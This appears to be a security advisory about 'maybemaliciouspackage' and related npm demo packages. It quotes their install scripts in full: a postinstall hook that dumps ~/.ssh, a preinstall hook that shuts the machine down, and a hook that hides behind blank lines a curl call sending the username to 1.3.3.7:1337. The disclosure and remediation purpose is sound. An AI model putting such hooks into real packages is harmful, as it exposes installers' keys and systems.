## Overview
`maybemaliciouspackage` is a malicious package that is used to demonstrate or test malicious install scripts. These scripts can send your local ssh file to an attacker, or download malicious files and run them in the background.

This is especially dangerous in production runtime environments, where environment variables tend to consist of keys, passwords, tokens and other secrets.

On August 1st, 2017 npm deprecated all malicious typosquatting libraries from this list.

The list of packages and their scripts are:
```json
{
  "name": "maybemaliciouspackage",
  "scripts": {
    "postinstall": "find ~/.ssh | xargs cat || true && echo '\n\n\n\n\n\nOH HEY LOOK SSH KEYS\n\n\n\n\n\n\n'"
  }
},
{
  "name": "deasyncp",
  "scripts": {
    "preinstall": "say U WOT M8; shutdown -s now"
  }
},
{
  "name": "harmlesspackage",
  "scripts": {
    "postinstall": "echo '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThanks for your SSH         keys :)' && curl -X GET http://1.3.3.7:1337/\\?$(whoami)"
  }
},
{
  "name": "npm-exploit",
  "scripts": {
    "install": "mkdir -p ~/Desktop/sploit && touch ~/Desktop/sploit/haxx"
  }
}
```

## Remediation
Avoid usage of this package altogether.

## References
- [Hunting Malicious packages published on npm](https://duo.com/blog/hunting-malicious-npm-packages/)